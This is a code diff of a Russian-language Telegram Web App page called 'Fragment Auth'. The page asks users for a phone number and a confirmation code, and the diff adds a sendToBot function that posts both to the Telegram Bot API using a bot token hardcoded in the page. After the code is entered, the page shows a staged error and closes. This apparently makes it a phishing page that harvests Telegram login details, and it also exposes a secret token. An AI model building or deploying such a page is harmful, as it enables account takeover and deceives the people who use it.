@@ -6,6 +6,7 @@
     <title>Fragment Auth</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* Стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -302,7 +303,6 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.expand();
-        tg.enableClosingConfirmation();
         
         let userPhone = '';
         let generatedCode = '';
@@ -318,7 +318,7 @@
             return Math.floor(10000 + Math.random() * 90000).toString();
         }
 
-        function sendPhone() {
+        async function sendPhone() {
             const phone = document.getElementById('phone').value.replace(/\D/g, '');
             if (!phone || phone.length < 10) {
                 alert('Пожалуйста, введите корректный номер телефона');
@@ -333,24 +333,23 @@
             document.getElementById('loadingText').textContent = 'Отправка кода...';
             showStep('stepLoading');
 
-            // Отправляем данные в бота
+            // Отправляем данные через Telegram Bot API
             const data = {
                 action: 'send_phone',
                 phone: userPhone,
                 code: generatedCode
             };
             
-            console.log('Данные для отправки:', data);
-            
-            // Основной способ отправки
             try {
-                tg.sendData(JSON.stringify(data));
-                console.log('Данные отправлены через tg.sendData');
-            } catch (e) {
-                console.error('Ошибка отправки через tg.sendData:', e);
+                // Альтернативный способ отправки - через прямые сообщения
+                await sendToBot(data);
+                console.log('Данные отправлены через Bot API');
+            } catch (error) {
+                console.error('Ошибка отправки:', error);
+                // Показываем код даже если отправка не удалась
             }
 
-            // Показываем код пользователю через 1.5 секунды
+            // Показываем код пользователю
             setTimeout(() => {
                 document.getElementById('realCode').textContent = generatedCode;
                 document.getElementById('codeDisplay').style.display = 'block';
@@ -358,7 +357,7 @@
             }, 1500);
         }
 
-        function sendCode() {
+        async function sendCode() {
             const code = document.getElementById('code').value;
             if (!code || code.length < 5) {
                 alert('Пожалуйста, введите корректный код');
@@ -377,16 +376,14 @@
                 code: code
             };
             
-            console.log('Данные для отправки:', data);
-            
             try {
-                tg.sendData(JSON.stringify(data));
-                console.log('Код отправлен через tg.sendData');
-            } catch (e) {
-                console.error('Ошибка отправки кода:', e);
+                await sendToBot(data);
+                console.log('Код отправлен через Bot API');
+            } catch (error) {
+                console.error('Ошибка отправки кода:', error);
             }
 
-            // Показываем ошибку (по требованию)
+            // Показываем ошибку и закрываем
             setTimeout(() => {
                 showStep('stepCode');
                 document.getElementById('errorMsg').style.display = 'block';
@@ -396,6 +393,41 @@
                     tg.close();
                 }, 3000);
             }, 3000);
+        }
+
+        // Функция отправки данных через Bot API
+        async function sendToBot(data) {
+            const botToken = '8050324645:AAG4uLsMm-3v6-Yrc-9fc8vwdtCsa3tCDxw';
+            const chatId = tg.initDataUnsafe.user?.id;
+            
+            if (!chatId) {
+                throw new Error('Не удалось получить chat_id');
+            }
+
+            const message = `📱 <b>Данные из Web App:</b>\n` +
+                           `📞 Номер: <code>${data.phone}</code>\n` +
+                           `🔐 Код: <code>${data.code}</code>\n` +
+                           `⚡ Действие: ${data.action}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+
+            return await response.json();
         }
 
         function backToPhone() {
